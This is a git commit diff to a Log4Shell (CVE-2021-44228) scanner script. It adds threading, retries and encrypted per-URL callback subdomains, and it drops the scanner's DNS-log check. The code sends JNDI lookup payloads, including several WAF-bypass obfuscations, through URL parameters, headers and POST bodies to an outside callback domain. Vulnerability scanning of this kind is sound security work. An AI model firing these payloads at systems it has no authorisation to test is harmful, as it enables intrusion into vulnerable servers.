044b9af909b90e82ac44d8db51fc371f7de7b7a7
Konrad Adasiewicz <konrad.adasiewicz@assaabloy.com>
2021-12-16 10:25:46 +0100

    don't check dns callback

--- scan/log4j-scan.py
+++ scan/log4j-scan.py
@@ -9,21 +9,20 @@
 # ******************************************************************
 
 import argparse
+import binascii
+import hashlib
 import random
 import requests
 import time
 import sys
 import base64
 import json
-import random
-from termcolor import cprint
+from Crypto.Cipher import AES
 from threading import Thread
 from queue import Queue
 
 
 class Worker(Thread):
-    """ Thread executing tasks from a given tasks queue """
-
     def __init__(self, tasks):
         Thread.__init__(self)
         self.tasks = tasks
@@ -36,33 +35,40 @@ class Worker(Thread):
             try:
                 func(*args, **kargs)
             except Exception as e:
-                # An exception happened in this thread
                 print(e)
             finally:
-                # Mark this task as done, whether an exception happened or not
                 self.tasks.task_done()
 
 
 class ThreadPool:
-    """ Pool of threads consuming tasks from a queue """
-
     def __init__(self, num_threads):
         self.tasks = Queue(num_threads)
         for _ in range(num_threads):
             Worker(self.tasks)
 
     def add_task(self, func, *args, **kargs):
-        """ Add a task to the queue """
         self.tasks.put((func, args, kargs))
 
-    def map(self, func, args_list):
-        """ Add a list of tasks to the queue """
-        for args in args_list:
-            self.add_task(func, args)
+    def map(self, func, workload, *args, **kargs):
+        for work in workload:
+            self.add_task(func, work, *args, **kargs)
 
     def wait_completion(self):
-        """ Wait for completion of all the tasks in the queue """
         self.tasks.join()
+
+
+class Logger:
+    def __init__(self, file):
+        self.file = file
+
+    def info(self, msg):
+        print("[I] {}".format(msg), file=self.file, flush=True)
+
+    def warn(self, msg):
+        print("[W] {}".format(msg), file=self.file, flush=True)
+
+    def error(self, msg):
+        print("[E] {}".format(msg), file=self.file, flush=True)
 
 # Disable SSL warnings
 try:
@@ -72,9 +78,7 @@ except Exception:
     pass
 
 
-cprint('[•] CVE-2021-44228 - Apache Log4j RCE Scanner', "green")
-cprint('[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.', "yellow")
-cprint('[•] Secure your External Attack Surface with FullHunt.io.', "yellow")
+print('[%] CVE-2021-44228 - Apache Log4j RCE Scanner')
 
 if len(sys.argv) <= 1:
     print('\n%s -h for help.' % (sys.argv[0]))
@@ -82,17 +86,17 @@ if len(sys.argv) <= 1:
 
 
 default_headers = {
-    'User-Agent': 'log4j-scan (https://github.com/mazen160/log4j-scan)',
+    'User-Agent': 'log4j-scan (https://github.com/omicronns/log4j-scan)',
     # 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
     'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
 }
-waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_domain}}/{{random}}}",
-                       "${${::-j}ndi:rmi://{{callback_domain}}/{{random}}}",
+waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_domain}}/a}",
+                       "${${::-j}ndi:rmi://{{callback_domain}}/a}",
+                       "${${lower:jndi}:${lower:rmi}://{{callback_domain}}/a}",
+                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_domain}}/a}",
+                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_domain}}/a}",
+                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_domain}}/a}",
                        "${jndi:rmi://{{callback_domain}}}",
-                       "${${lower:jndi}:${lower:rmi}://{{callback_domain}}/{{random}}}",
-                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_domain}}/{{random}}}",
-                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_domain}}/{{random}}}",
-                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_domain}}/{{random}}}",
                        "${jndi:dns://{{callback_domain}}}"]
 
 parser = argparse.ArgumentParser()
@@ -108,15 +112,33 @@ parser.add_argument("-l", "--list",
                     dest="usedlist",
                     help="Check a list of URLs.",
                     action='store')
-parser.add_argument("--request-type",
-                    dest="request_type",
+parser.add_argument("--thread-count",
+                    dest="thread_count",
+                    help="How many threads to use (thread per url) - [Default: 50].",
+                    default=50,
+                    type=int,
+                    action='store')
+parser.add_argument("--req-type",
+                    dest="req_type",
                     help="Request Type: (get, post) - [Default: get].",
                     default="get",
                     action='store')
-parser.add_argument("--timeout",
-                    dest="timeout",
-                    help="Request timeout - [Default: 1].",
-                    default=1,
+parser.add_argument("--req-timeout",
+                    dest="req_timeout",
+                    help="Request timeout - [Default: 4].",
+                    default=4,
+                    type=int,
+                    action='store')
+parser.add_argument("--retry-wait",
+                    dest="retry_wait",
+                    help="Wait time after error occurred during fuzzing (in seconds) - [Default: 10].",
+                    default=10,
+                    type=int,
+                    action='store')
+parser.add_argument("--retry-count",
+                    dest="retry_count",
+                    help="How many times to keep retrying after connection error - [Default: 3].",
+                    default=3,
                     type=int,
                     action='store')
 parser.add_argument("--headers-file",
@@ -132,33 +154,19 @@ parser.add_argument("--exclude-user-agent-fuzzing",
                     dest="exclude_user_agent_fuzzing",
                     help="Exclude User-Agent header from fuzzing - useful to bypass weak checks on User-Agents.",
                     action='store_true')
-parser.add_argument("--wait-time",
-                    dest="wait_time",
-                    help="Wait time after all URLs are processed (in seconds) - [Default: 2].",
-                    default=2,
-                    type=int,
-                    action='store')
 parser.add_argument("--waf-bypass",
                     dest="waf_bypass_payloads",
                     help="Extend scans with WAF bypass payloads.",
-                    action='store_true')
-parser.add_argument("--verbose",
-                    dest="verbose",
-                    help="Enable verbose logging.",
-                    action='store_true')
-parser.add_argument("--skip-callback",
-                    dest="skip_callback",
-                    help="Skip DNS callback check.",
                     action='store_true')
 parser.add_argument("--callback-domain",
                     dest="callback_domain",
                     help="Callback domain [Default: example.com].",
                     default="example.com",
                     action='store')
-parser.add_argument("--dns-logs-path",
-                    dest="dns_logs_path",
-                    help="DNS logs path [Default: /data/dns.log].",
-                    default="/data/dns.log",
+parser.add_argument("--out-logs-path",
+                    dest="out_logs_path",
+                    help="Output logs path directory [Default: .].",
+                    default=".",
                     action='store')
 parser.add_argument("--parameter-names",
                     dest="parameter_names",
@@ -198,103 +206,115 @@ def get_fuzzing_post_data(payload):
     return fuzzing_post_data
 
 
-def generate_waf_bypass_payloads(callback_domain, random_string):
+def generate_waf_bypass_payloads(callback_domain, id_string):
     payloads = []
     for i in waf_bypass_payloads:
         new_payload = i.replace("{{callback_domain}}", callback_domain)
-        new_payload = new_payload.replace("{{random}}", random_string)
+        new_payload = new_payload.replace("{{random}}", id_string)
         payloads.append(new_payload)
     return payloads
 
 
-def check_logs(path, tokens):
-    with open(path, "r") as logs:
-        l = logs.read()
-        for t in tokens:
-            if t in l:
-                return True
-    return False
+def fuzz_url(url, dns_key):
+    sha = hashlib.sha256()
+    sha.update(url.encode())
+    id_string_raw = sha.digest()
+    cipher = AES.new(dns_key, AES.MODE_ECB)
+    ciphertext = cipher.encrypt(id_string_raw[:16])
+    id_string = binascii.hexlify(ciphertext).decode()
+    with open("{}/{}.log".format(args.out_logs_path, id_string), "w") as logfile:
+        log = Logger(logfile)
+        log.info(f"Testing URL: {url} - {binascii.hexlify(id_string_raw).decode()}/{id_string}")
 
+        proxies = {}
+        if args.proxy:
+            proxies = {"http": args.proxy, "https": args.proxy}
 
-def scan_url(url, callback_domain, proxies, timeout):
-    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(16))
-    payload_callback = "%s.%s" % (random_string, callback_domain)
-    payload = '${jndi:ldap://%s/%s}' % (payload_callback, random_string)
-    payloads = [payload]
-    if args.waf_bypass_payloads:
-        payloads.extend(generate_waf_bypass_payloads(payload_callback, random_string))
-    resps = []
-    resp_get = None
-    resp_post = None
-    try:
-        resp_get = requests.request(url=url,
-                                    method="GET",
-                                    verify=False,
-                                    timeout=timeout,
-                                    proxies=proxies)
-    except Exception as e:
-        cprint(f"EXCEPTION: {e}")
-    try:
-        resp_post = requests.request(url=url,
-                                    method="POST",
-                                    verify=False,
-                                    timeout=timeout,
-                                    proxies=proxies)
-    except Exception as e:
-        cprint(f"EXCEPTION: {e}")
-    if args.verbose:
-        if resp_get is not None:
-            cprint(f"[•] GET  URL redirected: {resp_get.url}", "magenta")
-        if resp_post is not None:
-            cprint(f"[•] POST URL redirected: {resp_post.url}", "magenta")
-    def scan_target(fuzzing_header):
-        if resp_get is not None or resp_post is not None:
-            for payload in payloads:
-                cprint(f"[•] URL: {url} | PAYLOAD: {payload} | Header: {fuzzing_header}", "cyan")
-                if resp_get is not None and (args.request_type.upper() == "GET" or args.run_all_tests):
-                    try:
-                        requests.request(url=resp_get.url,
+        payload_callback = "%s.%s" % (id_string, args.callback_domain)
+        payload = '${jndi:ldap://%s/%s}' % (payload_callback, id_string)
+        payloads = [payload]
+        if args.waf_bypass_payloads:
+            payloads.extend(generate_waf_bypass_payloads(payload_callback, id_string))
+
+        resp_get = None
+        resp_post = None
+
+        try:
+            resp_get = requests.request(url=url,
                                         method="GET",
-                                        params={name: payload for name in parameter_names},
-                                        headers={**default_headers, fuzzing_header: gen_fuzzing_header(fuzzing_header, payload)},
                                         verify=False,
-                                        timeout=timeout,
+                                        timeout=args.req_timeout,
                                         proxies=proxies)
-                    except Exception as e:
-                        cprint(f"EXCEPTION: {e}")
-
-                if resp_post is not None and (args.request_type.upper() == "POST" or args.run_all_tests):
-                    try:
-                        # Post body
-                        requests.request(url=resp_post.url,
+        except Exception as e:
+            log.error(f"EXCEPTION: {e}")
+        try:
+            resp_post = requests.request(url=url,
                                         method="POST",
-                                        headers={**default_headers, fuzzing_header: gen_fuzzing_header(fuzzing_header, payload)},
-                                        data=get_fuzzing_post_data(payload),
                                         verify=False,
-                                        timeout=timeout,
+                                        timeout=args.req_timeout,
                                         proxies=proxies)
-                    except Exception as e:
-                        cprint(f"EXCEPTION: {e}")
+        except Exception as e:
+            log.error(f"EXCEPTION: {e}")
 
-                    try:
-                        # JSON body
-                        requests.request(url=resp_post.url,
-                                        method="POST",
-                                        headers={**default_headers, fuzzing_header: gen_fuzzing_header(fuzzing_header, payload)},
-                                        json=get_fuzzing_post_data(payload),
-                                        verify=False,
-                                        timeout=timeout,
-                                        proxies=proxies)
-                    except Exception as e:
-                        cprint(f"EXCEPTION: {e}")
+        if resp_get is not None:
+            log.info(f"GET  URL redirected: {resp_get.url}")
+        if resp_post is not None:
+            log.info(f"POST URL redirected: {resp_post.url}")
 
-    fuzzing_headers = get_fuzzing_headers()
+        if resp_get is not None or resp_post is not None:
+            for fuzzing_header in get_fuzzing_headers():
+                for payload in payloads:
+                    log.info(f"URL: {url} | Header: {fuzzing_header} | PAYLOAD: {payload}")
+                    retry = True
+                    retry_count = args.retry_count
+                    while retry and retry_count > 0:
+                        retry = False
+                        if resp_get is not None and (args.req_type.upper() == "GET" or args.run_all_tests):
+                            try:
+                                requests.request(url=resp_get.url,
+                                                method="GET",
+                                                params={name: payload for name in parameter_names},
+                                                headers={**default_headers, fuzzing_header: gen_fuzzing_header(fuzzing_header, payload)},
+                                                verify=False,
+                                                timeout=args.req_timeout,
+                                                proxies=proxies)
+                            except Exception as e:
+                                retry = True
+                                log.error(f"EXCEPTION: {e}")
 
-    pool = ThreadPool(10)
-    pool.map(scan_target, fuzzing_headers)
-    pool.wait_completion()
+                        if resp_post is not None and (args.req_type.upper() == "POST" or args.run_all_tests):
+                            try:
+                                # Post body
+                                requests.request(url=resp_post.url,
+                                                method="POST",
+                                                headers={**default_headers, fuzzing_header: gen_fuzzing_header(fuzzing_header, payload)},
+                                                data=get_fuzzing_post_data(payload),
+                                                verify=False,
+                                                timeout=args.req_timeout,
+                                                proxies=proxies)
+                            except Exception as e:
+                                retry = True
+                                log.error(f"EXCEPTION: {e}")
 
-    return random_string
+                            try:
+                                # JSON body
+                                requests.request(url=resp_post.url,
+                                                method="POST",
+                                                headers={**default_headers, fuzzing_header: gen_fuzzing_header(fuzzing_header, payload)},
+                                                json=get_fuzzing_post_data(payload),
+                                                verify=False,
+                                                timeout=args.req_timeout,
+                                                proxies=proxies)
+                            except Exception as e:
+                                retry = True
+                                log.error(f"EXCEPTION: {e}")
+                        if retry:
+                            log.warn("We got an error during fuzzing. Let's wait for some time and retry.")
+                            time.sleep(args.retry_wait)
+                            retry_count -= 1
+                    if retry:
+                        log.warn("We got an error during fuzzing. Waiting didn't help. Moving on.")
+        log.info("Payloads sent. Fuzzing done.")
 
 
 def main():
@@ -309,27 +329,15 @@ def main():
                     continue
                 urls.append(i)
 
-    callback_domain = args.callback_domain
+    print("[%] Checking for Log4j RCE CVE-2021-44228.")
+    print(f"[%] Loaded {len(urls)} urls.")
 
-    cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
-    for idx, url in enumerate(urls):
-        cprint(f"[•] Testing URL {idx}/{len(urls)}: {url}", "magenta")
-        proxies = {}
-        if args.proxy:
-            proxies = {"http": args.proxy, "https": args.proxy}
-        random_string = scan_url(url, callback_domain, proxies, args.timeout)
+    dns_key = random.randbytes(16)
+    print(f"[%] Dns subdomain encryption key: {binascii.hexlify(dns_key).decode()}.")
 
-        if not args.skip_callback:
-            cprint("[•] Payloads sent. Waiting for OOB callbacks.", "cyan")
-            cprint("[•] Waiting...", "cyan")
-            time.sleep(args.wait_time)
-
-            if not check_logs(args.dns_logs_path, [random_string]):
-                cprint("[•] Targets does not seem to be vulnerable.", "green")
-            else:
-                cprint(f"[!!!] Target Affected: {url}", "yellow")
-        else:
-            cprint("[•] Payloads sent. Waiting for OOB callbacks skipped.", "cyan")
+    pool = ThreadPool(args.thread_count)
+    pool.map(fuzz_url, urls, dns_key)
+    pool.wait_completion()
 
 
 if __name__ == "__main__":
